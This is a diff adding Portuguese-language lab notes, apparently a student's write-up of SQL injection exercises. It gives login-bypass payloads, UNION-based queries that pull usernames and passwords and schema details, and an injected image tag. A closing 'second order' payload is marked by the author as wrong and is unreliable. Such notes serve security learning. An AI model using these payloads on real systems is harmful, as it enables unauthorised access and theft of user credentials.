@@ -1,0 +1,90 @@
+Basic SQL Injections 1
+
+R: user'-- //"		(sendo user "bob" ou "voldemort")
+- permite dar bypass ao acesso sem a password
+
+Justificação:
+	A validação é feita pela execução da linha seguinte:
+	
+SELECT * FROM users where username='".$user."' AND password='".md5($password)."'
+
+ao escrever bob'-- //" fechamos a validação sem precisar da password, ficando:
+
+SELECT * FROM users where username='bob'-- //"' AND password = 'd41d8cd98f00b204e9800998ecf8427e'
+
+ignora tudo o que for à frente do username e valida sem a password ser necessária.
+
+
+
+
+Basic SQL Injections 2
+
+R: semelhante mas como a validação é ligeiramente diferente, justamos o que é inserido para ter o mesmo efeito anterior na nova validação.
+
+user')-- //"
+
+validação:
+SELECT * FROM users where (username='".$user."') AND (password = '".md5($password)."')
+como fica:
+SELECT * FROM users where (username='bob')-- //"') AND (password = 'd41d8cd98f00b204e9800998ecf8427e')
+
+
+
+
+
+SQL Injections 1
+
+query:
+SELECT * FROM products WHERE product_name LIKE '".$query."%'
+
+inserir na pesquisa:
+b%' ORDER BY 5 -- //
+
+como é alterado:
+Select * from products where product_name like 'b%' ORDER BY 5 -- //%'
+
+' UNION SELECT 1,2,3,4,5 -- //
+escreve nas colunas o que está à frente do select
+
+' UNION SELECT null, id, username, password, fname FROM users -- //
+extrai da table de user os dados dos utilizadores e mostra os na tabela
+
+' UNION SELECT 1,'<img src="http://address"><img>',3,4,5 -- //
+..
+
+' UNION SELECT null, table_name, column_name, null, null FROM information_schema.columns -- // 
+alterando o penultinho query podemos extrair informação de outras tabelas ainda.
+no fundo, é à tentativa erro tentar acertar no nome das coisas
+
+
+
+
+
+SQL Second order attacks
+
+' or 1 in (SELECT ' FROM users) -- //`
+
+está qualquer coisa errada na query mas é por volta disto, testar de novo
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
